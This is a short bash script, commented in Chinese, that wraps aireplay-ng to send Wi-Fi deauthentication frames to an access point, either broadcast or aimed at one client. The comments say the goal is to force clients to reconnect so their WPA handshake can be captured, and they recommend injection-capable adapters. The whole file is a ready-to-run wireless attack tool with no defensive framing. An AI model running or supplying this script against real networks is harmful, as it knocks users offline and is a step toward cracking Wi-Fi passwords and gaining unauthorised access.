#!/bin/bash
# deauth.sh — 主动 deauth 触发客户端重连产生握手
# 用法: sudo bash deauth.sh <WIFI> <AP_MAC> [CLIENT_MAC] [COUNT]
# 需要支持注入的网卡 (RTL8812AU/AR9271). Intel/Pi 内置网卡注入不稳定或不支持
set -e
WIFI="${1:?usage: deauth.sh WIFI AP_MAC [CLIENT_MAC] [COUNT]}"
AP_MAC="${2:?need AP_MAC}"
CLIENT_MAC="$3"
COUNT="${4:-5}"

if [ -z "$CLIENT_MAC" ]; then
  echo "=== 广播 deauth (count=$COUNT) ==="
  aireplay-ng -0 "$COUNT" -a "$AP_MAC" "$WIFI"
else
  echo "=== 定向 deauth client=$CLIENT_MAC (count=$COUNT) ==="
  aireplay-ng -0 "$COUNT" -a "$AP_MAC" -c "$CLIENT_MAC" "$WIFI"
fi
echo "deauth 发完, 等客户端自动重连产生握手"
